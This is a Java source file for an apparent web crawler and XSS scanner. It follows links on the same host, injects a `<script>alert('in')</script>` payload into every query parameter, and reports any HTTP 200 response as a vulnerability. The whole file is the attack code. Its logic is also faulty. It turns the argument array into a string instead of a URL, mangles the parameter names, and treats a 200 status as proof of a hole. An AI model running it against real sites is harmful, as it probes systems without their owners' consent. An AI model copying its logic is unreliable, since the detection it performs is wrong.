import java.io.DataOutputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;
import java.util.ArrayList;
import java.util.LinkedList;
import java.util.List;

import javax.net.ssl.HttpsURLConnection;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;

public class App {

	private final String USER_AGENT = "Mozilla/5.0";
	private List<String> links;
	
	public App() {
		links = new ArrayList<String>();
	}

	public static void main(String[] args) {
		try {
			String str_url = args.toString();
			URL url = new URL(str_url);
			URI uri = url.toURI();
			
			App app = new App();
			app.check(url);
			
		} catch (URISyntaxException e) {
			e.printStackTrace();
		} catch (MalformedURLException e) {
			e.printStackTrace();
		}		
	}

	public void extractLinks(URL url){ 
		String attr = "";
		try {
			Document doc = Jsoup.connect(url.toString()).get();
			Elements links = doc.select("a[href]"); 
			for (Element link : links) { 
				attr = link.attr("abs:href");
				if(attr.indexOf(url.getHost()) != -1){
					startCheck(new URL(attr));
				}
			} 
		} catch (IOException e) {
			e.printStackTrace();
		} 
	}

	private void startCheck(URL url) {
		if(!visited(url.toString())){
			Runnable r_url = new Runnable(){
			     public void run(){
			        System.out.println("Running: " + url);
			        check(url);
			     }
			   };
	
			   Thread thread = new Thread(r_url);
			   thread.start();
		}
	}

	private synchronized boolean visited(String url){
		if(links.contains(url)){
			return true;
		}
		links.add(url);
		return false;
	}
	
	private void check(URL url){
		LinkedList<String> params = checkURL(url.toString());
		attack(url.toString(), params);
		extractLinks(url);
	}
	
	private LinkedList<String> checkURL(String url) {
		int index = url.indexOf("?");
		LinkedList<String> params = new LinkedList<String>();
		if(index != -1){
			int l_idx_param = url.indexOf("=", index);
			while(index != -1 && l_idx_param != -1){
				params.addLast(url.substring(index, l_idx_param));
				index = url.indexOf("&", l_idx_param);
				l_idx_param = url.indexOf("=", index);
			}
		}
		
		return params;
	}
	
	private boolean attack(String url, LinkedList<String> params){
		String urlParameters = "";
		boolean vuln_found = false;
		for (String p : params) {
			urlParameters = urlParameters.concat(p.concat("=<script>alert('in')</script>&"));
		}

		if(urlParameters != ""){
			urlParameters = urlParameters.substring(0, urlParameters.length()-2);
		}
		
		try {
			if(sendGet(url.concat(urlParameters))){
				vuln_found = true;
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return vuln_found;
	}
	
	
	// HTTP GET request
		private boolean sendGet(String url) throws Exception {

			//String url = "http://www.google.com/search?q=hello";

			URL obj = new URL(url);
			HttpURLConnection con = (HttpURLConnection) obj.openConnection();

			// optional default is GET
			con.setRequestMethod("GET");

			//add request header
			con.setRequestProperty("User-Agent", USER_AGENT);

			int responseCode = con.getResponseCode();
			System.out.println("\nSending 'GET' request to URL : " + url);
			System.out.println("Response Code : " + responseCode);

			if(responseCode == 200){
				//TODO: weakness found - save URL and params
				return true;
			}
			return false;
		}

		// HTTP POST request
		private void sendPost(String url, String urlParameters) throws Exception {

			//String url = "https://selfsolve.apple.com/wcResults.do";
			URL obj = new URL(url);
			HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();

			//add reuqest header
			con.setRequestMethod("POST");
			con.setRequestProperty("User-Agent", USER_AGENT);
			con.setRequestProperty("Content-Language", "en-US");
			
			// Send post request
			con.setDoOutput(true);
			DataOutputStream wr = new DataOutputStream(con.getOutputStream());
			wr.writeBytes(urlParameters);
			wr.flush();
			wr.close();

			int responseCode = con.getResponseCode();
			System.out.println("\nSending 'POST' request to URL : " + url);
			System.out.println("Post parameters : " + urlParameters);
			System.out.println("Response Code : " + responseCode);

			if(responseCode == 200){
				//TODO: weakness found - save URL and params
			}

		}
}
